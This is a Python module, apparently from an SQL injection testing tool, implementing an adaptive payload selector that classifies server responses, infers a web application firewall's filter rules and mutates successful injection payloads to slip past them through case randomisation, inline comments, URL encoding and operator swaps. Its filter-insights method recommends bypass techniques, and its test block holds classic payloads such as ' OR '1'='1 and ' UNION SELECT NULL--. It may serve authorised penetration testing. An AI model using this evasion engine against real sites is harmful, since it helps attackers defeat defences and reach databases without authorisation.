"""
Adaptive Payload Selector with Real-time Learning

Implements dynamic payload selection that learns from response patterns:
- Response classification (blocked, allowed, error, success)
- Payload effectiveness tracking
- Mutation engine for successful patterns
- Prioritized queue based on success rates
- Filter behavior analysis
"""

import logging
import random
import hashlib
from typing import List, Dict, Optional, Tuple, Any
from dataclasses import dataclass, field
from collections import defaultdict, deque
from enum import Enum
import time

logger = logging.getLogger(__name__)


class ResponseClass(Enum):
    """Classification of server responses"""
    BLOCKED = "blocked"  # WAF/filter blocked the request
    ALLOWED = "allowed"  # Request went through, no injection success
    ERROR = "error"  # SQL error indicates potential vulnerability
    SUCCESS = "success"  # Successful exploitation
    TIMEOUT = "timeout"  # Request timed out (potential time-based SQLi)
    UNKNOWN = "unknown"  # Cannot determine


@dataclass
class PayloadAttempt:
    """Record of a payload attempt"""
    payload: str
    response_class: ResponseClass
    timestamp: float
    response_time: float
    status_code: int
    response_length: int
    response_hash: str
    payload_category: str
    success_indicators: List[str] = field(default_factory=list)


@dataclass
class PayloadStats:
    """Statistics for a payload"""
    payload: str
    attempts: int = 0
    successes: int = 0
    blocks: int = 0
    errors: int = 0
    avg_response_time: float = 0.0
    success_rate: float = 0.0
    last_used: float = 0.0
    mutations_generated: int = 0


class AdaptivePayloadSelector:
    """
    Adaptive payload selector with real-time learning capabilities.
    
    Learns from response patterns to optimize payload selection:
    - Tracks success/failure patterns
    - Generates mutations of successful payloads
    - Prioritizes payloads based on observed effectiveness
    - Adapts to filter behavior
    """
    
    def __init__(self, learning_rate: float = 0.1):
        """
        Initialize adaptive payload selector.
        
        Args:
            learning_rate: Rate at which to adjust payload priorities (0-1)
        """
        self.learning_rate = learning_rate
        
        # Payload statistics
        self.payload_stats: Dict[str, PayloadStats] = {}
        
        # Attempt history
        self.attempt_history: deque = deque(maxlen=1000)
        
        # Success patterns for mutation
        self.successful_patterns: List[str] = []
        
        # Blocked pattern signatures
        self.blocked_patterns: Dict[str, int] = defaultdict(int)
        
        # Response baseline for comparison
        self.baseline_responses: Dict[str, Any] = {}
        
        # Filter behavior analysis
        self.filter_characteristics = {
            'blocks_quotes': False,
            'blocks_comments': False,
            'blocks_union': False,
            'blocks_keywords': set(),
            'case_sensitive': False,
            'checks_whitespace': False,
            'rate_limiting': False,
        }
        
        # Priority queue for payload selection
        self.priority_queue: List[Tuple[float, str]] = []
    
    def record_attempt(self, payload: str, response_class: ResponseClass,
                      response_time: float, status_code: int,
                      response_body: str, payload_category: str = "unknown") -> None:
        """
        Record a payload attempt and update statistics.
        
        Args:
            payload: The payload that was attempted
            response_class: Classification of the response
            response_time: Response time in seconds
            status_code: HTTP status code
            response_body: Response body content
            payload_category: Category of payload (union, boolean, time-based, etc.)
        """
        # Create attempt record
        response_hash = hashlib.md5(response_body.encode()).hexdigest()
        attempt = PayloadAttempt(
            payload=payload,
            response_class=response_class,
            timestamp=time.time(),
            response_time=response_time,
            status_code=status_code,
            response_length=len(response_body),
            response_hash=response_hash,
            payload_category=payload_category,
        )
        
        # Add to history
        self.attempt_history.append(attempt)
        
        # Update payload statistics
        if payload not in self.payload_stats:
            self.payload_stats[payload] = PayloadStats(payload=payload)
        
        stats = self.payload_stats[payload]
        stats.attempts += 1
        stats.last_used = time.time()
        
        # Update response time (exponential moving average)
        if stats.avg_response_time == 0:
            stats.avg_response_time = response_time
        else:
            alpha = 0.3
            stats.avg_response_time = (
                alpha * response_time + (1 - alpha) * stats.avg_response_time
            )
        
        # Update counters
        if response_class == ResponseClass.SUCCESS:
            stats.successes += 1
            self.successful_patterns.append(payload)
            logger.info(f"Successful payload recorded: {payload[:50]}...")
        elif response_class == ResponseClass.BLOCKED:
            stats.blocks += 1
            self._analyze_blocked_payload(payload)
        elif response_class == ResponseClass.ERROR:
            stats.errors += 1
        
        # Update success rate
        if stats.attempts > 0:
            stats.success_rate = stats.successes / stats.attempts
        
        # Update filter characteristics based on patterns
        self._update_filter_analysis(payload, response_class)
        
        # Update priority queue
        self._update_priorities()
    
    def _analyze_blocked_payload(self, payload: str):
        """Analyze blocked payload to understand filter rules"""
        payload_upper = payload.upper()
        
        # Check what got blocked
        if "'" in payload or '"' in payload:
            self.blocked_patterns['quotes'] += 1
        
        if '--' in payload or '#' in payload or '/*' in payload:
            self.blocked_patterns['comments'] += 1
        
        if 'UNION' in payload_upper:
            self.blocked_patterns['union'] += 1
        
        # Extract potentially blocked keywords
        keywords = ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'UNION', 'WHERE', 'OR', 'AND']
        for keyword in keywords:
            if keyword in payload_upper:
                self.blocked_patterns[f'keyword_{keyword}'] += 1
    
    def _update_filter_analysis(self, payload: str, response_class: ResponseClass):
        """Update filter characteristic analysis"""
        if response_class != ResponseClass.BLOCKED:
            return
        
        payload_upper = payload.upper()
        
        # Check if filter is case-sensitive
        if payload != payload.lower() and 'OR' in payload_upper:
            self.filter_characteristics['case_sensitive'] = True
        
        # Check specific blocks
        if "'" in payload or '"' in payload:
            self.filter_characteristics['blocks_quotes'] = True
        
        if '--' in payload or '#' in payload:
            self.filter_characteristics['blocks_comments'] = True
        
        if 'UNION' in payload_upper:
            self.filter_characteristics['blocks_union'] = True
        
        # Track blocked keywords
        keywords = ['SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'UNION', 'WHERE', 'OR', 'AND']
        for keyword in keywords:
            if keyword in payload_upper:
                self.filter_characteristics['blocks_keywords'].add(keyword)
    
    def get_next_payloads(self, count: int = 10, category: Optional[str] = None) -> List[str]:
        """
        Get next payloads to try, prioritized by learned effectiveness.
        
        Args:
            count: Number of payloads to return
            category: Optional category filter
            
        Returns:
            List of payloads ordered by priority
        """
        if not self.priority_queue:
            logger.warning("Priority queue is empty")
            return []
        
        # Sort by priority (higher is better)
        sorted_queue = sorted(self.priority_queue, key=lambda x: x[0], reverse=True)
        
        # Filter by category if specified
        if category:
            filtered = [
                payload for priority, payload in sorted_queue
                if self.payload_stats.get(payload, PayloadStats(payload=payload)).payload.upper().find(category.upper()) >= 0
            ]
            return filtered[:count]
        
        return [payload for priority, payload in sorted_queue[:count]]
    
    def _update_priorities(self):
        """Update priority queue based on learned statistics"""
        self.priority_queue = []
        
        for payload, stats in self.payload_stats.items():
            # Calculate priority score
            priority = self._calculate_priority(stats)
            self.priority_queue.append((priority, payload))
        
        # Sort by priority
        self.priority_queue.sort(key=lambda x: x[0], reverse=True)
    
    def _calculate_priority(self, stats: PayloadStats) -> float:
        """
        Calculate priority score for a payload.
        
        Factors:
        - Success rate (most important)
        - Recency (prefer recently successful)
        - Error rate (errors indicate potential vulnerability)
        - Diversity (avoid overusing same payload)
        """
        # Base priority on success rate
        priority = stats.success_rate * 100
        
        # Bonus for errors (potential vulnerability indicators)
        if stats.attempts > 0:
            error_rate = stats.errors / stats.attempts
            priority += error_rate * 20
        
        # Recency bonus (decay factor)
        if stats.last_used > 0:
            time_since_use = time.time() - stats.last_used
            recency_bonus = max(0, 10 - time_since_use / 60)  # Decay over 10 minutes
            priority += recency_bonus
        
        # Diversity penalty (avoid overusing successful payloads)
        if stats.attempts > 10:
            diversity_penalty = min(stats.attempts / 10, 5)
            priority -= diversity_penalty
        
        # Block penalty
        if stats.attempts > 0:
            block_rate = stats.blocks / stats.attempts
            priority -= block_rate * 30
        
        return max(0, priority)
    
    def generate_mutations(self, base_payload: str, count: int = 10) -> List[str]:
        """
        Generate mutations of a successful payload.
        
        Args:
            base_payload: Base payload to mutate
            count: Number of mutations to generate
            
        Returns:
            List of mutated payloads
        """
        mutations = set()  # Use set to avoid duplicates
        
        # Mutation strategies
        strategies = [
            self._mutate_quotes,
            self._mutate_whitespace,
            self._mutate_comments,
            self._mutate_case,
            self._mutate_encoding,
            self._mutate_operators,
        ]
        
        attempts = 0
        max_attempts = count * 5  # Allow more attempts to reach the target count
        
        while len(mutations) < count and attempts < max_attempts:
            # Apply random strategy
            strategy = random.choice(strategies)
            mutated = strategy(base_payload)
            
            if mutated and mutated != base_payload and mutated not in mutations:
                mutations.add(mutated)
                
                # Track mutation in stats
                if base_payload in self.payload_stats:
                    self.payload_stats[base_payload].mutations_generated += 1
            
            attempts += 1
        
        return list(mutations)
    
    def _mutate_quotes(self, payload: str) -> str:
        """Mutate quote characters"""
        replacements = {
            "'": ['"', '`', "''"],
            '"': ["'", '""'],
        }
        
        for old, new_options in replacements.items():
            if old in payload:
                return payload.replace(old, random.choice(new_options), 1)
        
        return payload
    
    def _mutate_whitespace(self, payload: str) -> str:
        """Mutate whitespace"""
        ws_options = [' ', '\t', '/**/', '+', '%20', '%09']
        return payload.replace(' ', random.choice(ws_options), 1)
    
    def _mutate_comments(self, payload: str) -> str:
        """Add or modify comment injection"""
        comment_options = ['/**/', '/*a*/', '/*!50000*/', '--', '#']
        
        # Insert comment randomly
        if ' OR ' in payload.upper():
            return payload.replace(' OR ', f' {random.choice(comment_options)}OR{random.choice(comment_options)} ')
        elif ' AND ' in payload.upper():
            return payload.replace(' AND ', f' {random.choice(comment_options)}AND{random.choice(comment_options)} ')
        
        return payload
    
    def _mutate_case(self, payload: str) -> str:
        """Randomly vary case"""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )
    
    def _mutate_encoding(self, payload: str) -> str:
        """Add encoding variations"""
        if ' ' in payload and random.random() > 0.5:
            return payload.replace(' ', '%20', 1)
        elif "'" in payload and random.random() > 0.5:
            return payload.replace("'", '%27', 1)
        return payload
    
    def _mutate_operators(self, payload: str) -> str:
        """Mutate logical operators"""
        replacements = {
            ' OR ': [' || ', ' or ', ' OR/**/'],
            ' AND ': [' && ', ' and ', ' AND/**/'],
            '=': ['LIKE', ' IN ', '>=', '<='],
        }
        
        for old, new_options in replacements.items():
            if old in payload:
                return payload.replace(old, random.choice(new_options), 1)
        
        return payload
    
    def get_filter_insights(self) -> Dict[str, Any]:
        """
        Get insights about detected filter behavior.
        
        Returns:
            Dictionary with filter characteristics and recommendations
        """
        insights = {
            'characteristics': dict(self.filter_characteristics),
            'blocked_patterns': dict(self.blocked_patterns),
            'recommendations': [],
        }
        
        # Generate recommendations based on filter behavior
        if self.filter_characteristics['blocks_quotes']:
            insights['recommendations'].append(
                "Filter blocks quotes - try hex encoding or CHAR() functions"
            )
        
        if self.filter_characteristics['blocks_comments']:
            insights['recommendations'].append(
                "Filter blocks comments - try newline injection or nested comments"
            )
        
        if self.filter_characteristics['blocks_union']:
            insights['recommendations'].append(
                "Filter blocks UNION - try comment injection or case variation"
            )
        
        if self.filter_characteristics['blocks_keywords']:
            blocked_kw = ', '.join(self.filter_characteristics['blocks_keywords'])
            insights['recommendations'].append(
                f"Filter blocks keywords: {blocked_kw} - try encoding or obfuscation"
            )
        
        return insights
    
    def get_statistics(self) -> Dict[str, Any]:
        """
        Get overall statistics about payload attempts.
        
        Returns:
            Dictionary with statistics
        """
        total_attempts = sum(s.attempts for s in self.payload_stats.values())
        total_successes = sum(s.successes for s in self.payload_stats.values())
        total_blocks = sum(s.blocks for s in self.payload_stats.values())
        
        return {
            'total_payloads_tried': len(self.payload_stats),
            'total_attempts': total_attempts,
            'total_successes': total_successes,
            'total_blocks': total_blocks,
            'overall_success_rate': total_successes / max(total_attempts, 1),
            'block_rate': total_blocks / max(total_attempts, 1),
            'successful_payloads': len(self.successful_patterns),
            'top_payloads': self._get_top_payloads(5),
        }
    
    def _get_top_payloads(self, count: int) -> List[Dict[str, Any]]:
        """Get top performing payloads"""
        sorted_stats = sorted(
            self.payload_stats.values(),
            key=lambda s: (s.success_rate, s.attempts),
            reverse=True
        )
        
        return [
            {
                'payload': s.payload[:50] + '...' if len(s.payload) > 50 else s.payload,
                'success_rate': f"{s.success_rate:.2%}",
                'attempts': s.attempts,
                'successes': s.successes,
            }
            for s in sorted_stats[:count]
        ]


if __name__ == "__main__":
    # Test the adaptive selector
    logging.basicConfig(level=logging.INFO)
    
    selector = AdaptivePayloadSelector()
    
    # Simulate some attempts
    test_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "admin' --",
    ]
    
    for payload in test_payloads:
        # Simulate varying success rates
        response_class = ResponseClass.SUCCESS if random.random() > 0.7 else ResponseClass.BLOCKED
        selector.record_attempt(
            payload=payload,
            response_class=response_class,
            response_time=random.uniform(0.1, 0.5),
            status_code=200,
            response_body="test response",
            payload_category="boolean"
        )
    
    # Get statistics
    stats = selector.get_statistics()
    print("\n=== Adaptive Selector Statistics ===")
    print(f"Total payloads tried: {stats['total_payloads_tried']}")
    print(f"Overall success rate: {stats['overall_success_rate']:.2%}")
    print(f"\nTop payloads:")
    for p in stats['top_payloads']:
        print(f"  {p['payload']} - {p['success_rate']} ({p['successes']}/{p['attempts']})")
